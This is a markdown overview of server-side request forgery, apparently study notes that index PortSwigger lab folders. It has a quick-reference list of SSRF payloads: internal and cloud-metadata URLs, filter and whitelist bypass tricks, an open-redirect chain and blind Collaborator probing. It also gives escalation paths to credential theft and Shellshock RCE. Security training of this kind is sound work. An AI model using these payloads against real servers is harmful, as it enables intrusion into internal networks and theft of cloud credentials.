# Server-side request forgery (SSRF) - topic overview & router

Make the server issue HTTP(S) requests to a location of your choosing. Because the request originates from the trusted server, it bypasses network ACLs and IP allow-lists: reach `localhost`/`127.0.0.1` admin panels, internal `192.168.x`/`10.x`/`169.254.169.254` services, and cloud metadata endpoints. Impact ranges from internal-data theft and access-control bypass to **RCE** (Shellshock, internal unpatched services) - typically High-Critical.

## 30-second quick reference

```
# basic - point a URL param at the server / internal hosts
stockApi=http://localhost/admin
stockApi=http://127.0.0.1/admin
stockApi=http://192.168.0.68/admin            # internal back-end
stockApi=http://169.254.169.254/latest/meta-data/   # cloud metadata (AWS)
# blacklist bypass (127.0.0.1 blocked):
http://127.1/            http://2130706433/      http://017700000001/
http://[::1]/            double-URL-encode chars: /admin -> /%2561dmin
# whitelist bypass (URL-parser confusion):
http://expected-host@evil-host        http://evil-host#expected-host
http://expected-host.evil-host        http://localhost:80%2523@expected-host/admin
# open-redirect bypass:
stockApi=https://ALLOWED/redirect?path=http://192.168.0.12/admin
# blind (no response shown) -> OAST:
Referer: http://BURP-COLLABORATOR-SUBDOMAIN
```

## Decision map - pick the sub-technique

| Observation | Go to | Why |
|---|---|---|
| A param takes a full URL and the response is returned | [Basic](Basic/) | hit localhost/internal directly, read the response |
| The URL is filtered (blacklist/whitelist) or only an allowed domain works | [Filter-bypass](Filter-bypass/) | alt IP encodings, URL-parser tricks, open-redirect chain |
| Response is NOT reflected (URL fetched but you can't see it) | [Blind](Blind/) | OAST/Collaborator detection; escalate to RCE (Shellshock) |

## Sub-technique folders
- `Basic/` - SSRF against the server (localhost/admin) and other back-end systems (internal IP sweep) (2 labs)
- `Filter-bypass/` - defeat blacklist (alt IP reps, encoding) and whitelist (`@`, `#`, parser confusion) filters, and chain an open redirect (3 labs)
- `Blind/` - out-of-band detection via Collaborator; Shellshock RCE via headers (2 labs)

## Root cause
The app fetches a user-influenced URL server-side and trusts requests from itself / its network. Access controls that assume "only trusted callers reach this" (loopback admin, disaster-recovery no-auth, internal-only ports) are bypassed when the SSRF server makes the call.

## Find it (hidden attack surface)
- **Obvious:** params holding full URLs (`stockApi`, `url`, `dest`, `callback`, `webhook`, image/PDF fetchers, link previewers).
- **Partial URLs:** params holding just a hostname or path that get concatenated into a server-side URL.
- **Data formats:** URLs inside XML (-> SSRF via [XXE](../XXE-injection/)), JSON, SOAP.
- **Headers:** `Referer` (analytics software visits it), `X-Forwarded-For`, `Host`, `True-Client-IP`.
- Test each by pointing at a Collaborator domain and watching for interaction (blind) or at `localhost`/internal IPs (informed).

## Chaining
- -> [Access-control](../Access-control/): reach loopback/internal admin panels.
- -> cloud takeover: `169.254.169.254` metadata -> IAM creds (note: not a lab here, but the #1 real-world SSRF payoff).
- -> [XXE-injection](../XXE-injection/): XXE is a common SSRF delivery vector.
- -> RCE: Shellshock / internal unpatched services (see Blind).
- Open-redirect chain overlaps [the open-redirect cheat sheet](../) and OAuth `redirect_uri` abuse.

## Tools
- **Burp Repeater** (swap the URL param), **Burp Intruder** (sweep internal IP octets), **Burp Collaborator** + **Collaborator Everywhere** (blind detection), **Burp Scanner**.

## References
- https://portswigger.net/web-security/ssrf
- https://portswigger.net/web-security/ssrf/blind
- https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet
